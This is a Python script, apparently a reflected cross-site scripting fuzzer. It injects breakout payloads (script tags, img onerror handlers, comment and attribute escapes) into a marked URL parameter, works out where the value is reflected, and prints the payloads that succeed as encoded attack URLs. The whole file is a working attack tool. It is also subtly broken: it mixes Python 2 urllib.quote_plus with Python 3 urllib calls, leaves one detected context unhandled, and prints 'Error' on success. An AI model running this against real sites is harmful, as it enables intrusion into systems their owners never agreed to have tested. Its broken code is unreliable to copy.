from html.parser import HTMLParser
import urllib
import re
import urllib.error
import sys
import urllib.request

CHECKVALUEXSS = "XSSCHECKEDHERE"
given_url = ""
CNT = 0

NOW_OPEN_TAGS = []
INITIALIZE_TAGS = []
INITIALIZE_NULL_TAG = ""
IGNR_TAGS = ['html', 'body', 'br']
TAG_MKLIST = ['input', 'textarea']

OCCR_NUM = 0
OCCR_PARSED = 0
PAYLOADS_LIST= []

PAYLOADS_FUZZ_START_END_TAG= [
    "\"/><script>alert(1)</script>",
    "\"\/><img src=\"gnp.png\" onerror=\"alert('XSS_CHECKED')\"/>",
    "\"\/><img src=\"vgfjpg\" onerror=\"alert('XSS_CHECKED')\"/>"
]

BASE_PAYLOAD = [
    "<img src=x onerror=alert(1)>",
    "<img src=\"javascript:alert(\"XSS Checked\");\">",
    "<input type=\"image\" src=\"javascript:alert('XSS Successful');\">",
    "<script>alert(1)</script>",
    "</title><script>alert(0)</script>",
]

PAYLOADS_FUZZ_ATTRIBUTE = [
    "\"><script>alert(0)</script>",
    "'><script>alert(0)</script",
    "\"><img src=\"fuzz.jpg\" onerror=\"alert('XSS_CHECKED')\"/>"
]

def main():
    if len(sys.argv) != 2 or CHECKVALUEXSS not in sys.argv[1]:
        exit(
            "Make sure that python xfuzz.py in proper format"
        )
    global given_url
    given_url = sys.argv[1]

    first_response = send_req(given_url)
    print("URL is loaded successfully")

    print("XSSCHECKVAL", CHECKVALUEXSS.lower())
    if first_response and CHECKVALUEXSS.lower() in first_response.lower():
        global CNT
        CNT = first_response.lower().count(CHECKVALUEXSS.lower())
    else:
        exit("Error: nothing found to test.")
    for k in range(CNT):
        print(
            "Occurence Number: "
            + str(k + 1)
        )
        global OCCR_NUM
        OCCR_NUM = k + 1
        occurence_count_scan(first_response)
        global DQUOTES_MANDATE, SQUOTE_MANDATE, TAG_ATTRIN, TAG_NONATTRIN, SCRP_TAG, NOW_OPEN_TAGS, CHARACTERS_PERMIT, INITIALIZE_TAGS, INITIALIZE_NULL_TAG, OCCR_PARSED
        INITIALIZE_TAGS, NOW_OPEN_TAGS, CHARACTERS_PERMIT = [], [], []
        (
            SQUOTE_MANDATE,
            DQUOTES_MANDATE,
            TAG_ATTRIN,
            TAG_NONATTRIN,
            SCRP_TAG,
        ) = (False, False, False, False, False)
        OCCR_PARSED = 0
        INITIALIZE_NULL_TAG = ""
    print(
        "Scan is done"
    )
    for payload in PAYLOADS_LIST:
        print(payload)


def occurence_count_scan(first_response):

    loc = analyze_HTML(first_response)
    if loc == "comment":
        print("found in a comment in HTML.")
        cmnt_break()
    elif loc == "script_data":
        print("Found as data in a script tag.")
    elif loc == "html_data":
        print("Found as data or plaintext on the page.")
        data_break()
    elif loc == "start_end_tag_attr":
        print("Found as an attribute in an empty tag.")
        attribute_break_endpoints()
    elif loc == "attr":
        print("Found as an attribute in an HTML tag.")
        attribute_break()




def chk_Param(param_input, param_cmp):
    chk_str = "XSSSTART" + param_input + "XSSEND"
    cmp_str = "XSSSTART" + param_cmp + "XSSEND"
    chk_URL = given_url.replace(CHECKVALUEXSS, chk_str)
    try:
        chk_re = send_req(chk_URL)
    except:
        chk_re = ""
    success = False

    occurence_counter = 0
    for m in re.finditer("XSSSTART", chk_re, re.IGNORECASE):
        occurence_counter += 1
        if (occurence_counter == OCCR_NUM) and (
            chk_re[m.start() : m.start() + len(cmp_str)].lower()
            == cmp_str.lower()
        ):
            success = True
            break
    return success

def analyze_HTML(first_response):
    parser = PARSER_HTML()
    loc = ""
    try:
        parser.feed(first_response)
    except Exception as exp:
        loc = str(exp)
    except:
        print("ERROR")
    return loc

def send_req(given_url):
    try:
        return urllib.request.urlopen(given_url).read().decode("utf-8")
    except Exception as e:
        print("error", e)
        print("Exiting, fail to open URL \n")





def data_break():
    payload = "<script>alert(1);</script>"
    if "textarea" in NOW_OPEN_TAGS:
        payload = "</textarea>" + payload
    if "title" in NOW_OPEN_TAGS:
        payload = "</title>" + payload
    if chk_Param(payload, payload):
        payload = payload
    else:
        found = False
        for pload in BASE_PAYLOAD:
            if chk_Param(urllib.quote_plus(pload), pload):
                payload = pload
                found = True
                break
        if not found:
            payload = ""
            print("not able to found")
    if payload:
        if payload not in PAYLOADS_LIST:
            PAYLOADS_LIST.append(payload)
        print(payload)
        print(
            "Encoded URL"
            + given_url.replace(CHECKVALUEXSS, urllib.parse.quote_plus(payload))
        )

def cmnt_break():
    payLoad = "--><script>alert(1);</script>"
    if chk_Param(payLoad, payLoad):
        payLoad = "--><script>alert(1);</script>"
        if chk_Param(payLoad + "<!--", payLoad + "<!--"):
            payLoad = "--><script>alert(1);</script><!--"
    else:
        if chk_Param("-->", "-->"):
            clean = chk_Param("<!--", "<!--")
            found = False
            for pl in BASE_PAYLOAD:
                pl = "-->" + pl
                if clean:
                    pl = pl + "<!--"
                if chk_Param(urllib.quote_plus(pl), pl):
                    payLoad = pl
                    PAYLOADS_LIST.append(
                        pl
                    )
                    found = True
                    break
            if not found:
                print(
                    "eRROR"
                )
        else:
            payLoad = ""
            print(
                "Error because of string format"
            )
    if payLoad:
        if payLoad not in PAYLOADS_LIST:
            PAYLOADS_LIST.append(payLoad)

        print(payLoad)
        print(
            "[+] Full URL Encoded: "
            + given_url.replace(CHECKVALUEXSS, urllib.quote_plus(payLoad))
        )


def attribute_break():
    payload = (
        '"></' + NOW_OPEN_TAGS[len(NOW_OPEN_TAGS) - 1] + "><script>alert(1);</script>"
    )
    if chk_Param(payload, payload):
        if chk_Param(
            payload + "<" + NOW_OPEN_TAGS[len(NOW_OPEN_TAGS) - 1] + '%20attr="',
            payload + "<" + NOW_OPEN_TAGS[len(NOW_OPEN_TAGS) - 1] + ' attr="',
        ):
            payload = (
                '"></'
                + NOW_OPEN_TAGS[len(NOW_OPEN_TAGS) - 1]
                + "><script>alert(1);</script><"
                + NOW_OPEN_TAGS[len(NOW_OPEN_TAGS) - 1]
                + ' attr="'
            )
    else:
        if chk_Param('">', '">'):
            clean_str = "<" + NOW_OPEN_TAGS[len(NOW_OPEN_TAGS) - 1] + ' attr="'
            clean = chk_Param(
                "<" + NOW_OPEN_TAGS[len(NOW_OPEN_TAGS) - 1] + '%20attr="', clean_str
            )
            found = False
            for pload in PAYLOADS_FUZZ_ATTRIBUTE:
                if clean:
                    pload = pload + clean_str
                if chk_Param(urllib.quote_plus(pload), pload):
                    payload = pload
                    found = True
                    break
            if not found:
                payload = ""
                print(
                    "Fail to success."
                )
        else:
            payloads_invalid = [
                '"<div><script>alert(1);</script>',
                '"</script><script>alert(1);</script>',
                '"</><script>alert(1);</script>',
                '"</><script>alert(1)</script>',
                '"<><img src="blah.jpg" onerror="alert(\'XSS\')"/>',
            ]
            found = False
            for pload in payloads_invalid:
                if chk_Param(urllib.quote_plus(pload), pload):
                    payload = pload
                    found = True
                    break
            if not found:
                payload = ""
                print("Error")
    if payload:
        if payload not in PAYLOADS_LIST:
            PAYLOADS_LIST.append(payload)

        print("success")
        print(payload)
        print(
            "Full URL Encoded: "
            + given_url.replace(CHECKVALUEXSS, urllib.quote_plus(payload))
        )


def attribute_break_endpoints():
    print("\n[Can tag attribute be escaped to execute XSS?]")
    payload = '"/><script>alert(1);</script>'
    if chk_Param(payload, payload):
        payload = '"/><script>alert(1);</script>'
        if chk_Param(payload + '<br%20attr="', payload + '<br attr="'):
            payload = '"/><script>alert(1);</script><br attr="'
    else:
        if chk_Param("/>", "/>"):
            clean = chk_Param('<br%20attr="', '<br attr="')
            found = False
            for pload in PAYLOADS_FUZZ_START_END_TAG:
                if clean:
                    pload = pload + '<br attr="'
                if chk_Param(urllib.quote_plus(pload), pload):
                    payload = pload
                    found = True
                    break
            if not found:
                payload = ""
                print("No successful fuzzing attacks.")
        else:

            payloads_invalid = [
                '"></' + INITIALIZE_NULL_TAG + "><script>alert(1);</script>",
                '"<div><script>alert(1);</script>',
            ]
            found = False
            for pload in payloads_invalid:
                if chk_Param(urllib.quote_plus(pload), pload):
                    payload = pload
                    found = True
                    break
            if not found:
                payload = ""
                print(
                    "Out of the attribute tag error."
                )
    if payload:
        if payload not in PAYLOADS_LIST:
            PAYLOADS_LIST.append(payload)
        print(
            "Error"
        )
        print(payload)
        print(
            "Encoded URL: "
            + given_url.replace(CHECKVALUEXSS, urllib.quote_plus(payload))
        )


class PARSER_HTML(HTMLParser):
    def handle_comment(self, data):
        global OCCR_PARSED
        if CHECKVALUEXSS.lower() in data.lower():
            OCCR_PARSED += 1
            if OCCR_PARSED == OCCR_NUM:
                raise Exception("comment")

    def handle_startendtag(self, tag, attrs):
        global OCCR_PARSED
        global OCCR_NUM
        global INITIALIZE_NULL_TAG
        if CHECKVALUEXSS.lower() in str(attrs).lower():
            OCCR_PARSED += 1
            if OCCR_PARSED == OCCR_NUM:
                INITIALIZE_NULL_TAG = tag
                raise Exception("start_end_tag_attr")

    def handle_starttag(self, tag, attrs):
        global NOW_OPEN_TAGS
        global INITIALIZE_TAGS
        global OCCR_PARSED
        # print CURRENTLY_OPEN_TAGS
        if tag not in IGNR_TAGS:
            NOW_OPEN_TAGS.append(tag)
        if CHECKVALUEXSS.lower() in str(attrs).lower():
            if tag == "script":
                OCCR_PARSED += 1
                if OCCR_PARSED == OCCR_NUM:
                    raise Exception("script")
            else:
                OCCR_PARSED += 1
                if OCCR_PARSED == OCCR_NUM:
                    raise Exception("attr")

    def handle_endtag(self, tag):
        global NOW_OPEN_TAGS
        global INITIALIZE_TAGS
        global OCCR_PARSED
        if tag not in IGNR_TAGS:
            NOW_OPEN_TAGS.remove(tag)

    def handle_data(self, data):
        global OCCR_PARSED
        if CHECKVALUEXSS.lower() in data.lower():
            OCCR_PARSED += 1
            if OCCR_PARSED == OCCR_NUM:
                try:
                    if NOW_OPEN_TAGS[len(NOW_OPEN_TAGS) - 1] == "script":
                        raise Exception("script_data")
                    else:
                        raise Exception("html_data")
                except:
                    raise Exception("html_data")


if __name__ == "__main__":
    main()
